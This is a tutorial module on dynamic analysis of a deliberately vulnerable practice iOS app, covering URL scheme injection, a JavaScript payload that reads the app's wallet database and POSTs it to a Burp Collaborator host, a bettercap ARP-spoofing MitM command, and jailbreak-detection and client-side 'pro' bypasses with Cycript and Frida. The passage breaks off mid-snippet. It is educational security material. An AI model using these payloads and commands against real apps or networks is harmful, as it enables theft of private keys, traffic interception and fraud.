### Module 4 - Dynamic Analysis and Hacking
As you could see in the previous module, I personally _love_ to perform static analyses on iOS applications. But most of the security researchers and hackers prefer the dynamic analyses of systems. This is where you get to write code for exploits, run the applications and verify if they are vulnerable. This is a very interactive step and instead of seating down and reading assembly code or reading `.json`/`.plist` files, you get to inject code into the running application or send data to it and analyze how it parses and reacts to it.

One of the biggest differences between performing a dynamic analysis on an Android application vs an iOS application is the fact that in 99.9% of the time, on iOS, you need a physical device. This is because **all** the applications that you download from the App Store are compiled for an `ARM` architecture and the iOS simulators use your computer chip, meaning they have an `x86` or `x86_64` architecture.

The second obstacle you'll face is that, although it's not necessary, you probably will need that physical device to be jailbroken. This is because, as you learned in [Module 2](../Module-2/README.md), **all** applications downloaded from the App Store are encrypted. Meaning, if you are not able to get a _decrypted_ version of the application you want to analyze, you'll need to decrypt it yourself.

_Note: For the exercises in this module you need a device, but it doesn't need to be jailbroken for all the exercises because you'll be using the same [`CoinZa.ipa`](https://github.com/ivRodriguezCA/RE-iOS-Apps-Extras-Github/tree/master/Files) application which is already decrypted. You'll only need a jailbroken device for the Cycript and Frida exercises._

The exercises in this module are going to be different from the previous module. I'm going to present you a list of vulnerabilities, explaining you _what_ the vulnerability is and _how_ to exploit it, then you can test it on your own device.

#### Installing `CoinZa` on your device
To do the exercises in this module you'll need to first install the `CoinZa` application on your device. Luckily is super simple.
- If you haven't already, sign up for an `Apple Developer Account` [here](https://developer.apple.com/) (click on the `Account` tab), it's free.
- Connect your device to your computer.
- Open `Cydia Impactor` and drag-n-drop the `CoinZa.ipa`. **Important** it has to be the original `.ipa` you downloaded [here](https://github.com/ivRodriguezCA/RE-iOS-Apps-Extras-Github/tree/master/Files) and not the binary you extracted.
- Enter your developer username and password and wait for `Impactor` to load install the application on your device.
- Troubleshooting:
    - If `Impactor` says your password is incorrect (_and you're 100% sure it's not_) or something about an "app-specific password". It probably means you need to generate an app-specific password, here's a [tutorial on how to do it](https://www.imore.com/how-generate-app-specific-passwords-iphone-ipad-mac).
    - If `Impactor` shows an error about a certificate request already in place:
        - On the top menu select `Xcode`.
        - Select `Revoke Certificates`.
        - **SUPER IMPORTANT:** This is probably not a new developer account, what this action will do is revoke the signing certificates for that account.
    - If after `Impactor` is done installing the application, you tap on its icon and iOS says something about the application not being _trusted_:
        - Open the `Settings` app.
        - Select `General`.
        - Scroll down and select `Profiles & Device Management`.
        - In the `Developer App` section, select your developer account.
        - Tap `Trust` and confirm.

##### URL Scheme injection
As you discovered in the static analysis step, the `CoinZa` application uses custom `Scheme URLs` and if you use what you learned in [Module 3](../Module-3/README.md) and open the application binary in `Hopper` (or `Ghidra`), search for the `AppDelegate` class, select the `application:openURL:options:` method and open it in the `pseudo-code` mode you can find:
```c
r2 = @"news";
if (objc_msgSend(r19, @selector(containsString:)) != 0x0) {
        r2 = @"news";
        r20 = [[r19 stringByReplacingOccurrencesOfString:@"news/" withString:@""] retain];
        r23 = [[NSBundle mainBundle] retain];
        r22 = [[UIStoryboard storyboardWithName:@"Main" bundle:r23] retain];
        r0 = [r22 instantiateViewControllerWithIdentifier:@"WebViewController"];
        r23 = r0;
        r0 = [r0 configureWithHTMLString:r20];
        r24 = [[UINavigationController alloc] initWithRootViewController:r23];
        r0 = [r21 window];
        r25 = [[r0 rootViewController] retain];
        r0 = [r25 topViewController];
        r0 = objc_msgSend(r0, @selector(presentViewController:animated:completion:));
}
```
- I cleaned up the code by removing some instructions. Most of the code is self-explanatory but if you're new to iOS and/or Objc, you might not know what a `UIStoryboard` or a `UINavigationController` are. That's okay, you can just read the documentation. But to save you time, I'll explain what's going on in this code snippet:
    - I didn't copy it here, but the register 19 (`r19`) is the URL passed as part of the `URL Type`. Basically a string looking like this `coinza://<something>`.
    - First there's a check if `r19` contains the string `"news"`.
    - If it doesn't, it just bypasses all this code.
    - If it does, it removes all the occurrences of the string `"news/"` from `r19` and assigns the result to `r20`.
    - Then it creates an instance of a view controller called `WebViewController`. Presumably, based on its name, it's a view controller that loads a WebView.
    - Then it calls a method named `configureWithHTMLString:`. We can assume this method is expecting a string that contains HTML code. The important thing to realize is that the HTML this class is expecting comes from `r20`, which we saw is the result of removing the string `"news/"` from the **original** passed in URL. This URL is controlled by the attacker!
    - Then performs a bunch of not so important instructions.
    - And finally it calls a method named `presentViewController:animated:completion:` which presents the `WebViewController`.
- **How:** Testing this vulnerability is very simple. With the `CoinZa` application installed on your device:
    - Open `Mobile Safari` and paste this string: `<html><body><script>document.location = 'https://google.com';</script></body></html>`.
    - You'll have to encode the URL first, the encoded version will look like this: `coinza://news/%3Chtml%3E%3Cbody%3E%3Cscript%3Edocument.location%20%3D%20%27https%3A%2F%2Fgoogle.com%27%3B%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E`
    - After pasting **the encoded** string in `Mobile Safari`, press `Go`.
    - Confirm that you want to open the `CoinZa` application.
    - That's it! The `CoinZa` application will be launched and it will present a WebView screen called `"News"` and it will be redirected to the `google.com` website.
- **The problem:** The application is trusting **any** string after the `coinza://` and displaying it directly in a WebView. This is very similar to a web vulnerability called [Open Redirect](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.md) that allows attackers to redirect a user from a legitimate website to a malicious one. This vulnerability can be used to perform phishing attacks.

![Custom Scheme URL - Open Redirect](https://github.com/ivRodriguezCA/RE-iOS-Apps-Extras-Github/blob/master/Module-4/scheme-url.gif?raw=true)

##### Extracting files using Javascript (XSS)
After identifying that the application takes arbitrary `HTML` code and displays it on a WebView, you can start testing what access does this WebView give you to its internal files. All iOS applications by default have [these directories](https://developer.apple.com/library/archive/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html) for storing data:
    - `Documents`: This directory is used to store user generated data. This is data the application cannot replicate on its own. For example pictures taken by the user, or a database containing the messages a user sends and receives. This directory is backed up in iCloud or iTunes when a device backup is created.
    - `Library`: This directory is used to store data that is not generated by the user but is not generated solely by the application. For example application logs, analytics logs are commonly stored here. iOS also creates 2 subdirectories called `Application Support` and `Caches`. With the exception of the `Caches` directory, all the subdirectories and files in this directory are backed up in iCloud or iTunes when a device backup is created.
    - `tmp`: As the name suggests, this directory is used to store temporary data. The application should not rely on data stored here. This directory is not backed up at all when a device backup is created.
- Based on this information you can see that the perfect place to store a database containing the user data is in `Documents`. In the static analysis mode you discovered a _secret_ key called `SQLCIPHER_KEY`, this gave you a hint that the application is probably using the [SQLCipher](https://www.zetetic.net/sqlcipher/) library thus a local database _could_ exist. To be absolutely sure this is the case open the application binary in `Hopper` (or `Ghidra`), search for `Utils`, select the `initDatabase` method and open it in the `pseudo-code` mode you can find:
```c
+(void)initDatabase {
    r0 = [NSBundle mainBundle];
    r19 = [[r0 objectForInfoDictionaryKey:@"SQLCIPHER_KEY"] retain];
    r0 = NSSearchPathForDirectoriesInDomains(0x9, 0x1, 0x1);
    r0 = [r0 objectAtIndex:0x0];
    r22 = [[r0 stringByAppendingPathComponent:@"sqlcipher.db"] retain];
    r20 = r0;
    objc_msgSend(r0, @selector(UTF8String));
    if (sub_10004af04() == 0x0) {
            r21 = @selector(UTF8String);
            r0 = objc_msgSend(r0, r21);
            sub_10003804c(var_38, r0, strlen(r0));
            objc_retainAutorelease(@"CREATE TABLE IF NOT EXISTS Wallets (publicKey       CHAR(100) NOT NULL,privateKey     CHAR(100) NOT NULL,username      CHAR(100) NOT NULL,balance          REAL NOT NULL,PRIMARY KEY (publicKey) );");
            sub_10003ad1c(var_38, objc_msgSend(@"CREATE TABLE IF NOT EXISTS Wallets (publicKey       CHAR(100) NOT NULL,privateKey     CHAR(100) NOT NULL,username      CHAR(100) NOT NULL,balance          REAL NOT NULL,PRIMARY KEY (publicKey) );", r21), 0x0, 0x0, 0x0);
            sub_100049604();
    }
}
```
- Again, I've cleaned up the code by removing some instructions. But let me explain what's going on here:
    - The first thing the method is doing is getting the _secret_ key you found in the `Info.plist` earlier. As you can read in the [documentation](https://developer.apple.com/documentation/foundation/nsbundle/1408696-objectforinfodictionarykey) the `objectForInfoDictionaryKey:` method returns a value in the application's `Info.plist` determined by the key passed in as the first parameter, which in this case is `@"SQLCIPHER_KEY"`.
    - Then, as you can read in the [documentation](https://developer.apple.com/documentation/foundation/1414224-nssearchpathfordirectoriesindoma?language=objc), the method `NSSearchPathForDirectoriesInDomains` will return a list of path strings for the specified directories. The directory is determined by the first parameter, in this case it's an integer enumerated type (or enum) with a value of Hex `0x9` (which is `9` in decimal). If you [search the documentation](https://developer.apple.com/documentation/foundation/filemanager/searchpathdirectory/documentdirectory) it says that's the `NSDocumentDirectory` enum.
    - Then the code appends the path component `@"sqlcipher.db"` to the end of the documents path, via the `stringByAppendingPathComponent:` method. Ending up with something like `/<something>/Documents/sqlcipher.db`
    - Then if the return value of `sub_10004af04()` is zero or `nil`, it creates an SQL table called `Wallets` with 4 columns: `publicKey`, `privateKey`, `username` and `balance`.
- You can now confirm, with high confidence, there's a database store in the `Documents` folder of the application.
- Since you know the application is rendering `HTML` (and `Javascript`) from data you can control, you can try inserting `Javascript` code that will read a file from the `Documents` folder.
- To save you time, I've written the following code:
    ```html
    <html>
       <body>
          <script>
             function loadFile() {
                var xmlhttp = new XMLHttpRequest();
                documentsPath = document.URL.split('/').slice(0, -1).join('/');
                filePath = documentsPath + '/' + 'sqlcipher.db';
                xmlhttp.onreadystatechange = function() {
                   if (xmlhttp.readyState == 4) {
                      if (xmlhttp.responseText.length > 0) {
                        var xmlhttp2 = new XMLHttpRequest();
                        xmlhttp2.open("POST","http://<some-id>.burpcollaborator.net",false);
                        xmlhttp2.send(xmlhttp.responseText);
                      }
                   }
                };
                xmlhttp.onerror = function() {
                   alert('Error! ' + filePath);
                }
                xmlhttp.open('GET', filePath, true);
                xmlhttp.send();
             }
             window.onload = loadFile;
          </script>
          <p>
             Hello World
          </p>
       </body>
    </html>
    ```
- Let me explain what's going on:
    - I created a `Javascript` function called `loadFile`. This function creates an instance of `XMLHttpRequest`, which is used to retrieve data from a URL. It was originally created to avoid reloading entire webpages to show data to the user. But it works perfect for our purpose because at its most basic level, it just retrieves data from a URL.
    - The `document.URL.split('/').slice(0, -1).join('/')` is a chain of function calls that remove the last component of a website's URL, for example if the website URL is `https://example.com/index.html`, these operations would return `https://example.com`. I'm doing this to get the root of the directory where the currently rendered webpage is.
    - After getting the root directory I append the name of the database, which you previously found is `sqlcipher.db`.
    - Then I implement the `onreadystatechange` callback function and if the request's `readyState` is `4` (based on the [documentation](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/readyState) this means the `XMLHttpRequest` instance is done processing the data in the URL).
    - If the size of the `responseText` is grater than zero then send the data to a remote server. In this case you can use [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or any server you control, like the [Mac built-in server](https://discussions.apple.com/docs/DOC-3083).
    - Then I handle errors.
    - And finally setup the `XMLHttpRequest` with the database URL and call the `send()` function to start the operation.
- Similar to the the previous vulnerability to send this request you'll need to [URL-encode it](https://www.urlencoder.org/). Unlike the previous vulnerability, I don't provide the encoded version because this will be unique to your needs because of the remote server's URL.
- Once you've setup your remote server and encoded the `HTML` and `Javascript` code you can again open `Mobile Safari` and past the payload. Remember to add the `coinza://news/` custom scheme URL to the begining of the encoded code.
- **The problem:** This is the same problem as the previous example, but the vulnerability escalated to local file access. And to add to this problem, remember you found the hardcoded secret key for the `SQLCipher` database? in this case an attacker would be able to obtain the database and because every single install uses the same encryption key, they can decrypt the database and obtain all the information, which you already saw contains the `privateKey` of the user's wallets.

![Custom Scheme URL - Open Redirect](https://github.com/ivRodriguezCA/RE-iOS-Apps-Extras-Github/blob/master/Module-4/xss.gif?raw=true)

##### Man-in-the-Middle attack
In one of the vulnerabilities I described in [Module 3](../Module-3/README.md) was in the `AFNetworking` framework. This vulnerability allowed attackers to provide applications with fake or invalid TLS/SSL certificates and the application would gladly accept them. This is referred to as a `Man-in-the-Middle` attack or MitM attack for short. Imagine you want to connect to my website [`https://ivrodriguez.com`](https://ivrodriguez.com), right now it would serve you with a [Let's Encrypt](https://letsencrypt.org/) TLS certificate. But if you are under a MitM attack, you'd receive a different certificate, for example from `Evil Corp Inc.`, claiming that it is the valid certificate for [`https://ivrodriguez.com`](https://ivrodriguez.com), hopefully your browser would reject that connection. But for iOS applications running the version `2.5.1` of `AFNetworking`, the connection would be accepted. _Note: If your device is jailbroken you won't be able to perform all the steps in this exercise because the application has a jailbreak detection. You can jump to the `Cycript` exercise if you want to learn how to disable the jailbreak detection and then come back to this exercise._
- Open the application binary in `Hopper` (or `Ghidra`), search for the `Utils` class, select the `downloadWhitePaper:` method and you'll find:
    ```c
    +(void)downloadWhitePaper:(void )arg2 {
      r20 = [[AFURLSessionManager alloc] initWithSessionConfiguration:[[NSURLSessionConfiguration defaultSessionConfiguration] retain]];
      r0 = NSSearchPathForDirectoriesInDomains(0x9, 0x1, 0x1);
      r22 = [[r0 firstObject] retain];
      r25 = [[self whitepaperName] retain];
      r23 = [[r22 stringByAppendingPathComponent:r25] retain];
      r26 = [[NSURL fileURLWithPath:r23] retain];
      [self removeFileIfExistsAtPath:r26];
      r25 = [[NSURLRequest requestWithURL:[[NSURL URLWithString:@"https://raw.githubusercontent.com/ivRodriguezCA/RE-iOS-Apps-Extras-Github/master/Files/coinza.html"] retain]] retain];
      r0 = [r20 downloadTaskWithRequest:r25 progress:0x0 destination:&var_78 completionHandler:&var_A0];
      r0 = [r0 retain];
      objc_msgSend(r0, @selector(resume));
    }
    ```
- As you can see this method is using the `AFURLSessionManager` to download a file from a remote URL.
- If you open the application binary in `Hopper` (or `Ghidra`), search for the `InitialViewController` class, select the `viewDidLoad` method and you'll find that this method is called there:
    ```c
    -(void)viewDidLoad {
        [[&var_30 super] viewDidLoad];
        [r19 setTitle:@"CoinZa"];
        if (objc_msgSend(@class(Utils), @selector(isJailbroken)) != 0x0) {
            //spoiler alert for Jailbroken devices ;)
        } else {
            :
            :
            objc_msgSend(@class(Utils), @selector(downloadWhitePaper:));
        }
    }
    ```
- This means that every time the `InitialViewController`'s view is loaded, the application will download the `coinza.html` file. This gives an attacker a window to remotely attack a user, because they can perform a MitM attack and return a malicious version of the `coinza.html` file.
- Using `bettercap` you'll be able to target a remote user's device and serve fake TLS certificates and sniff their HTTP _and_ HTTPS traffic.
    - Open the `Settings` application, navigate to `Wi-Fi`, tap on your WiFi's SSID and copy your device's IP.
    - On your computer, run `bettercap` and enter your root password:
    ```bash
    sudo bettercap -eval "set arp.spoof.targets <Device-IP>; arp.spoof on; https.proxy on" --debug
    Password:
    ```
    - You should see something like this:
    ```bash
    [20:41:19] [mod.started] net.recon
    [20:41:19] [session.started] {session.started [some date]] PDT <nil>}
    [20:41:19] [mod.started] events.stream
    [20:41:19] [mod.started] net.recon
    [20:41:19] [sys.log] [dbg] arp.spoof  addresses=[redacted] macs=[] whitelisted-addresses=[] whitelisted-macs=[]
    [20:41:19] [endpoint.new] endpoint [redacted] detected as [redacted] (Apple, Inc.).
    [20:41:19] [endpoint.new] endpoint [redacted] detected as [redacted] (Apple, Inc.).
    [20:41:19] [endpoint.new] endpoint [redacted] detected as [redacted] (Apple, Inc.).
    [20:41:19] [sys.log] [inf] arp.spoof enabling forwarding
    [20:41:19] [mod.started] arp.spoof
    [20:41:19] [sys.log] [inf] https.proxy loading proxy certification authority TLS key from /var/root/.bettercap-ca.key.pem
    [20:41:19] [sys.log] [inf] https.proxy loading proxy certification authority TLS certificate from /var/root/.bettercap-ca.cert.pem
    [20:41:19] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
    [20:41:19] [sys.log] [dbg] arp.spoof sending 60 bytes of ARP packet to [redacted].
    [20:41:19] [sys.log] [inf] http.proxy enabling forwarding.
    [20:41:19] [sys.log] [dbg] http.proxy applied redirection [en2] (TCP) :443 -> [redacted]:8083
    [20:41:19] [mod.started] https.proxy
    [20:41:19] [sys.log] [inf] https.proxy started on [redacted]:8083 (sslstrip disabled)
    [redacted] > [redacted]  » [20:41:20] [sys.log] [dbg] arp.spoof sending 60 bytes of ARP packet to [redacted]:21.
    [redacted]/24 > [redacted]  » [20:41:21] [sys.log] [dbg] arp.spoof sending 60 bytes of ARP packet to [redacted].
    ```
    - Open the `CoinZa` application on your phone and you should see some logs like these:
    ```bash
    [redacted]/24 > [redacted]  » [20:41:24] [sys.log] [dbg] https.proxy proxying connection from [redacted] to raw.githubusercontent.com
    [redacted]/24 > [redacted]  » [20:41:24] [sys.log] [inf] https.proxy creating spoofed certificate for raw.githubusercontent.com:443
    [redacted]/24 > [redacted]  » [20:41:24] [sys.log] [dbg] Fetching TLS certificate from raw.githubusercontent.com:443 ...
    [redacted]/24 > [redacted]  » [20:41:24] [sys.log] [dbg] https.proxy <  GET raw.githubusercontent.com/ivRodriguezCA/RE-iOS-Apps-Extras-Github/master/Files/coinza.html
    [redacted]/24 > [redacted]  » [20:41:24] [sys.log] [dbg] https.proxy >  GET raw.githubusercontent.com/ivRodriguezCA/RE-iOS-Apps-Extras-Github/master/Files/coinza.html
    [redacted]/24 > [redacted]  » [20:41:25] [sys.log] [dbg] arp.spoof sending 60 bytes of ARP packet to [redacted].
    ```
    - You can verify that the application accepted the certificate provided by `bettercap` because if you tap on the `Read our whitepaper` button, the document shown there is the `coinza.html` file the application just downloaded. Since on line 7 of the `pseudo-code` you can see the `removeFileIfExistsAtPath:` method is called, it means that if an `HTML` file is shown it has to be a fresh download.
    - If you open any other application it will, hopefully, not be able to reach their server because `bettercap` is giving a _spoofed_ certificate for their domain. For example `Twitter` fails to load.
- With this approach you can serve a malicious file to the `https://raw.githubusercontent.com/ivRodriguezCA/RE-iOS-Apps-Extras-Github/master/Files/coinza.html` request. This would be another way to achieve the same result as the previous hack where you injected `Javascript` code via custom scheme URLs, except this time you'd provide the code via this malicious file.
- **The problem:** As you can see this is a very dangerous vulnerability that can be exploited remotely and the user wouldn't even notice the attack. In this case I showed the vulnerability by downloading a file, but in a real world scenario the requests would be bank accounts information, medical data, social media posts, etc. It's very important for developers to properly review 3rd party frameworks. Like I said before, the moment a developer includes a 3rd party framework in their application, it becomes their responsibility to maintain up-to-date and in this case the developer clearly failed to do so.

##### Bypassing jailbreak detection with Cycript
Since you need a jailbroken device for this exercise, I'm assuming you've been using a jailbroken device so far. This means that you probably haven't been able to use all the features of the application because it has a `Jailbreak detection` feature that prevents you from using it. But in this exercise I'll show you how to bypass this detection. `Cycript` will help you manipulate iOS applications at runtime. It means that while the application is running you'll be able to modify its behavoiur. You need a jailbroken device for this exercise. _Note: Many people don't realize that it should actually be pronounced `ssss-crypt` as you can read [here](http://www.cycript.org/manual/) you can also hear [Jay Freeman](https://twitter.com/saurik) (aka Saurik), who is the `Cycript` author, pronouncing it in this [video](https://www.youtube.com/watch?v=5d1cK0nq4GY) from the 2013 360|iDev conference._

- Open the application binary in `Hopper` (or `Ghidra`), search for the `InitialViewController` class, select the `viewDidLoad` method and you'll find the jailbreak detection:
    ```c
    if (objc_msgSend(@class(Utils), @selector(isJailbroken)) != 0x0) {
            [r19 setCollectionView:0x0];
            [[UIAlertController alertControllerWithTitle:@"CoinZa" message:@"Sorry not sorry." preferredStyle:0x1] retain];
            objc_msgSend(r19, @selector(presentViewController:animated:completion:));
            [r20 release];
    }
    ```
- As you can see the application is using the `isJailbroken` method from the `Utils` class to determine if the device is jailbroken. Many developers do this hoping that people won't be able to use their application on jailbroken devices, but as all client-side checks on iOS applications, with determination, time and good skills they all can be bypassed.

**If your device's iOS version < 11.0**
- Run `iTunnel` to forward your SSH traffic via USB:
    ```bash
    itnl --lport 2222 --iport 22
    ```
- SSH into your device:
    ```bash
    ssh -p 2222 root@localhost
    ```
- Open the `CoinZa` application by tapping on its icon.
- Inject `Cycript` into the running application:
    ```bash
    cycript -p CoinZa
    ```
    - If this fails, you can search for the application process id (`pid`):
        ```bash
        ps aux | grep CoinZa
        ```
    - Copy the `pid` and pass it to `Cycript`
        ```bash
        cycript -p 1427
        ```
- You have now an interactive console that you can use to send commands to the `CoinZa` application.

**If your device's iOS version >= 11.0**
- Run `iTunnel` to forward your SSH traffic via USB:
    ```bash
    itnl --lport 2222 --iport 22
    ```
- SSH into your device:
    ```bash
    ssh -p 2222 root@localhost
    ```
- Open the `CoinZa` application by tapping on its icon.
- Use `bfinject` to inject `Cycript` into the running application:
    ```bash
    cd /jb/bfinject
    bash bfinject -P CoinZa -L cycript
    ```
- On your device you should see a popup saying that `Cycript` was loaded  and that it is now listening on port `1337` at the device's IP.
    - If this step fails, simply force close the application, relaunch it and run the command again.
- On your computer you can now use `Cycript` to remotely connect to the application using the IP and port shown on the popup by `bfinject` on your device:
    ```bash
    cycript -r <Device-IP>:1337
    ```
- You have now an interactive console that you can use to send commands to the `CoinZa` application.
- If you get the followign error:
```bash
dyld: Library not loaded: /System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/lib/libruby.2.0.0.dylib
Referenced from: /usr/local/bin/Cycript.lib/cycript-apl
Reason: image not found
Abort trap: 6
```
  - Install Ruby 2.0:
  ```bash
  brew install ruby@2.0
  ```
  - Copy the library to `Cycript.lib`
  ```bash
  cp /usr/local/Cellar/ruby\@2.0/2.0.0-p648_7/lib/libruby.2.0.0.dylib /usr/local/bin/Cycript.lib/
  ```

**Any version of iOS**
- Now that you have an interactive console via `Cycript` we can start by removing that annoying popup. First we are going to use the `choose` function to get all the instances of the `UIAlertController` class. The `choose` function reads the provided class signature and searches the memory for objects that have a similar signature and returns an array of all the objects it can find:
    ```bash
    cy$ choose(UIAlertController)
    ```
    - It should return something similar to `[#"<UIAlertController: 0x1727b200>"]`, it means that there's only one instance of `UIAlertController` in memory. This makes sense since that's literally all we see on screen at the moment.
- You can access the instance by its index, as you would on a `Javascript` array, and assign it to a variable:
    ```bash
    cy$ var alert = choose(UIAlertController)[0]
    ```
- Then dismiss the alert by calling the Objc method [`dismissViewControllerAnimated:completion:`](https://developer.apple.com/documentation/uikit/uiviewcontroller/1621505-dismissviewcontrolleranimated?language=objc) on the variable:
    ```bash
    cy$ [alert dismissViewControllerAnimated:YES completion:nil]
    ```
    - You should see the alert disappear from your device's screen! This is just a taste of the power of `Cycript`, you are literally modifying the behavoiur of the application.
- But after this you still can't see anything. The problem is that like you saw from the `pseudo-code`, the view controller has the jailbreak detection in its `viewDidLoad` method. This means it's now too late to modify that behavoiur. But you can create a new `InitialViewController` instance and present it right?!
- Before doing that though, you need to patch the `+[Utils isJailbroken]` method, otherwise this new instance will also display a popup. To do you need to override the method implementation:
    ```bash
    cy$ Utils.constructor.prototype['isJailbroken']  = function() { return NO; }
    ```
    - This is how you replace method implementations with `Cycript`. Since this is a [class method](https://developer.apple.com/library/archive/documentation/General/Conceptual/DevPedia-CocoaCore/ClassMethod.html) we use the `constructor` keyword, for instance methods just remove that keyword and use `ClassName.prototype['methodName']`
- You can test the new returned value by calling the method:
    ```bash
    cy$ [Utils isJailbroken]
    ```
- Now that you've modified the returned value of the `isJailbroken` method, you can create the new `InitialViewController` instance:
    ```bash
    cy$ var storyBoard = [UIStoryboard storyboardWithName:@"Main" bundle:[NSBundle mainBundle]]
    cy$ var initVC = [storyBoard instantiateViewControllerWithIdentifier:@"InitialViewController"]
    cy$ navCon = [[UINavigationController alloc] initWithRootViewController:initVC]
    ```
    - Don't worry if you are a bit confused with this code, it's just iOS _idiom_ for creating a view controller. _Note: If this is the case, I'd suggest taking a few courses on iOS development so that it would help your research._
- Present it and you can finally start using the application:
    ```bash
    cy$ var app = [UIApplication sharedApplication]
    cy$ var del = [app delegate]
    cy$ del.window.rootViewController = navCon
    ```

##### Enabling 'ProVersion' features with Frida
If you've played around with the `CoinZa` application, you've probably noticed that you can create `Wallets` and you can increase their balance by entering a fake credit card (_actually you don't even need the credit card information_).
- This time I'll show you the assembly code because the `pseudo-code` is a bit hard to understand and it makes it kind of difficult to show you what the application is doing. Open the application binary in `Hopper` (or `Ghidra`), search for the `WalletDetailViewController` class, select the `didUpdateWalletBalance:` method and the `Control Flow Graph` (or `CFG Mode`) tab, this is the tab between `ASM Mode` and `Pseudo-cod Mode`. Then look at the left branch of the flow:
    ```
    [1] adrp       x8, #0x1001ad000
    [2] ldr        d0, [x8, #0x2f0] ; double_value_1_2
    [3] fmul       d8, d8, d0
    [4] ldr        x0, [x8, #0x910] ; argument "instance" for method imp___stubs__objc_msgSend, objc_cls_ref_NSString,_OBJC_CLASS_$_NSString
    [5] adrp       x8, #0x1001f0000
    [6] ldr        x1, [x8, #0x500] ; argument "selector" for method imp___stubs__objc_msgSend, "stringWithFormat:",@selector(stringWithFormat:)
    [7] str        d8, [sp, #0x60 + var_60]
    [8] adrp       x2, #0x1001c5000 ; 0x1001c5f98@PAGE
    [9] add        x2, x2, #0xf98 ; 0x1001c5f98@PAGEOFF, @"Since you are a pro user we added an extra 20%% and it's on us!\\nYour balance will actually increase by US$%f."
    [10] bl         imp___stubs__objc_msgSend ; objc_msgSend
    [11] mov        x29, x29
    ```
    - In the instruction `[2]` it loads a value `1.2` to `d0`.
    - In the instruction `[3]` you can see the assembly instruction `fmul` which, based on the [ARM documentation](http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0802b/FMUL_float.html), is a `floating-point` multiplication instruction, in this case it will multiply `d0` and `d8` and store it in `d8`. `d0` is the `1.2` value and `d8` is where the original value of the balance is stored.
    - What you can get from this is that if the `isProVersion` flag is true, the balance is increased by 20% because the original amount is multiplied by `1.2`.
- In a real life scenario this would be _literally_ free money and the check is done on the client side, there would be a very good incentive to force the application to "believe" this is a `ProVersion`.
- While you're still in `Hopper` (or `Ghidra`) looking at `WalletDetailViewController`, select the `pseudo-code` tab and you'll see something similar to this:
    ```c
    r0 = [NSUserDefaults standardUserDefaults];
    r2 = @"isProVersion";
    if (objc_msgSend(r0, @selector(boolForKey:)) != 0x0) {
            r8 = 0x1001f0000;
            r2 = @"isProVersion";
            r1 = @selector(stringWithFormat:);
            r2 = @"Since you are a pro user we added an extra 20%% and it's on us!\nYour balance will actually increase by US$%f.";
            r0 = objc_msgSend(@class(NSString), r1);
    }
    ```
    - This means that the value for `isProVersion` is a bool value saved in [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults). You just need to set this value to true and you'll be able to "get free money" or more accurately, enable the pro version.

**If your jailbreak includes Cydia**
- You should be all set because in [Module 1](../Module-1/README.md) you installed `Frida`.

**If your jailbreak doesn't include Cydia or is NOT jailbroken**
- You'll need to perform a few extra steps before you can start using `Frida`.
- Download the latest version of `Frida`'s dynamic library (aka dylib) from [here](https://build.frida.re/frida/ios/lib/).
- If you don't have a unmodified version of the unzipped application, unzip the `CoinZa.ipa` application:
    ```bash
    mv CoinZa.ipa CoinZa.zip
    unzip CoinZa.zip
    ```
- Copy the `FridaGadget.dylib` to the `Frameworks/` folder within the `CoinZa` application.
    ```bash
    cp FridaGadget.dylib Payload/CoinZa.app/Frameworks
    ```
- Clone the latest version of `insert_dylib` and build it using `xcodebuild` (you need Xcode to be installed for this to work):
    ```bash
    git clone https://github.com/Tyilo/insert_dylib
    cd insert_dylib
    xcodebuild
    ```
    - `insert_dylib` is a command line tool that allows you to insert `dylibs` into Mach-o binaries (for example iOS applications).
- After you've cloned and built `insert_dylib`, insert the `FridaGadget.dylib`:
    ```bash
    ./insert_dylib --strip-codesig --inplace '@executable_path/Frameworks/FridaGadget.dylib' Payload/CoinZa.app/CoinZa
    ```
    - If you move the `insert_dylib` executable to `/usr/local/bin/` you'll be able to run the command from any directory and without the `./` prefix:
      ```bash
      mv insert_dylib/build/Release/insert_dylib /usr/local/bin/insert_dylib
      ```
- Repackage the application:
    ```bash
    zip -qry CoinZa-Frida.ipa Payload
    ```
- Now you can use `Cydia Impactor` to resign and install the application on your device. (Just like you did with the original version of `CoinZa.app`).

**With Frida setup completed**
- The first thing you need to do is the same steps you did with `Cycript`, dismiss the popup and disable the jailbreak detection.
- Open the application on your device by tapping its icon.
- Connect your device to your computer.
- Connect to Frida from your computer there's no need for `iTunnel`, simply:
    ```bash
    frida -U CoinZa
    ```
- To dismiss the popup we are going to use the following code:
    ```javascript
    var alertController = ObjC.classes.UIAlertController
  	ObjC.choose(alertController, {
  		onMatch: function (alert) {
  			alert.dismissViewControllerAnimated_completion_(true, NULL);
  			return 'stop';
  		},
  		onComplete: function () {
  			console.log('[+] Done dismissing annoying alert!');
  		}
  	});
    ```
    - This snippet of code is using the `ObjC.choose` function to iterate over the application memory and identifying objects that match the `ObjC.classes.UIAlertController` signature. It is similar to `Cycript`'s `choose`, except that this function returns every value by calling the `onMatch` callback. This iterator can be stopped by returning the string `stop` and since I know there's only one `UIAlertController` I stop after the first one is found.
- The next step is to disable the jailbreak detection by overriding the `[Utils isJailbroken]` method, exactly the same as you did with `Cycript`. In Frida this is how you override returned values:
    ```javascript
    function bypassJailbreakDetection() {
    	try {
    		var hook = ObjC.classes.Utils['+ isJailbroken'];
    		Interceptor.attach(hook.implementation, {
    	    	onLeave: function(oldValue) {
    	    		_newValue = ptr("0x0") ;
    	    		oldValue.replace(_newValue);
    	    	}
    	    });

    	} catch(err) {
    		console.log("[-] Error: " + err.message);
    	}
    }
    ```
    - First you have to get a reference to the method you want to override and then in the `onLeave` callback you return the new value.
- And to finalize the same steps you did with `Cycript`, all is left is for you to present the new `InitialViewController`:
    ```javascript
    function presentInitialVC() {
    	var storyboardClass = ObjC.classes.UIStoryboard;
    	var bundleClasss = ObjC.classes.NSBundle;
    	var navConClass = ObjC.classes.UINavigationController;
    	var applicationClass = ObjC.classes.UIApplication;

    	var storyboard = storyboardClass.storyboardWithName_bundle_('Main',bundleClasss.mainBundle());
